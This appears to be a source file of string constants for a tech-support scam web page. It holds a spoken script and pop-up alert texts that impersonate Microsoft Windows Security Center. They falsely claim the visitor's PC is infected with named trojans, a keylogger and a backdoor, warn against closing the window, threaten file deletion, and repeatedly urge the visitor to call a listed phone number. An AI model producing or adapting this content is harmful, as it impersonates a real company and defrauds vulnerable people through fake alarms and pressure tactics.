export const PHONE = "+1-503-877-9717";
export const PHONE_TEL = "+15038779717";

/** Number voice ke liye clear digits */
export const PHONE_SPOKEN =
  "plus one, five zero three, eight seven seven, nine seven one seven";

/**
 * Pura problem + helpline number — ek paragraph voice padhegi.
 */
export const VOICE_PARAGRAPH =
  `Attention. This is an official message from Microsoft Windows Security Center. ` +
  `Please listen carefully and read the information on your screen. ` +
  `A critical security problem has been found on your computer. ` +
  `Virus and malware infections have been recognized on your device. ` +
  `Microsoft Windows is infected with Trojan S Locker. ` +
  `Additional threats detected include Spyware Win thirty two Key Logger, Backdoor Remote Access, and Adware Browser Hijack. ` +
  `Your firewall has been disabled by an unauthorized process. ` +
  `Windows Defender has been tampered with and is offline. ` +
  `A suspicious outbound connection to an unknown host was detected. ` +
  `Someone may be trying to access your browser password vault, camera, and microphone. ` +
  `Because of this major security breach, your personal data, banking information, and web login credentials saved on this PC are at serious risk. ` +
  `A critical error has also occurred due to an outdated version of the browser. ` +
  `Do not close this window. Do not restart your PC. Do not ignore this warning. ` +
  `To protect your files and remove these infections, you must call Microsoft Windows Support immediately. ` +
  `The helpline number to call is ${PHONE_SPOKEN}. ` +
  `I repeat, call Microsoft Windows Support now at ${PHONE_SPOKEN}. ` +
  `That number again is ${PHONE}. Stay on this page while you dial the number.`;

export const ALERT_MSG =
  "⚠ VIRUS DETECTED!\n\nMicrosoft Windows Security found Trojan:SLocker.\n\nREAD the information on screen.\n\nCall Microsoft Support:\n" +
  PHONE +
  "\n\nDo NOT close this window!";

export const ALERT_MSG_2 =
  "⚠ WARNING!\n\nLeaving this page may permanently delete your files.\n\nCall Microsoft NOW:\n" +
  PHONE;

export const BLUE_THREATS = [
  { name: "Trojan:SLocker", status: "ACTIVE", risk: "Critical" },
  { name: "Spyware:Win32/KeyLogger", status: "RUNNING", risk: "High" },
  { name: "Backdoor:RemoteAccess", status: "CONNECTED", risk: "Critical" },
  { name: "Adware:BrowserHijack", status: "INJECTED", risk: "Medium" },
];

export const BLUE_DETAILS = [
  "Firewall status: DISABLED by unauthorized process",
  "Windows Defender: Tampered / Offline",
  "Suspicious outbound connection to unknown host",
  "Browser credentials vault: ACCESS ATTEMPTED",
  "Camera & microphone: PERMISSION OVERRIDE DETECTED",
];
